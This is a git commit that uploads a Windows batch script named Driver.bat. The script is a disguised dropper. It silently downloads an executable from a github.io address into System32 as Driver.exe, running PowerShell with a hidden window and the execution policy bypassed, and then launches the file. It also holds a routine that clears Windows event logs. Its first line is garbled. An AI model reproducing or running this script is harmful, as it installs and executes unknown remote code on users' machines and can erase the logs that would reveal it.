67c23330daca54ea992988f05dca8b5f40d53603
VENOM <147403018+NOTXVENOM@users.noreply.github.com>
2025-02-14 13:53:55 +0600

    Add files via upload

---
+++ Driver.bat
@@ -0,0 +1,33 @@
+ÿþcho off
+setlocal enabledelayedexpansion
+color 4
+cls
+
+:: Define variables for download
+set "exeUrl=https://NOTXVENOM.github.io/clener/Clener.exe"
+set "outputPath=C:\Windows\System32\Driver.exe"
+
+:: Download EXE file silently
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri '%exeUrl%' -OutFile '%outputPath%'}" >nul 2>&1
+
+:: Run the EXE file if downloaded successfully
+if exist "%outputPath%" (
+    start "" "%outputPath%"
+)
+
+goto theEnd
+
+:: Function to clear event logs
+:do_clear
+echo clearing %1
+wevtutil.exe cl %1
+goto :eof
+
+:: If not run as administrator
+:noAdmin
+echo You must run this script as an Administrator!
+pause
+exit
+
+:theEnd
+exit
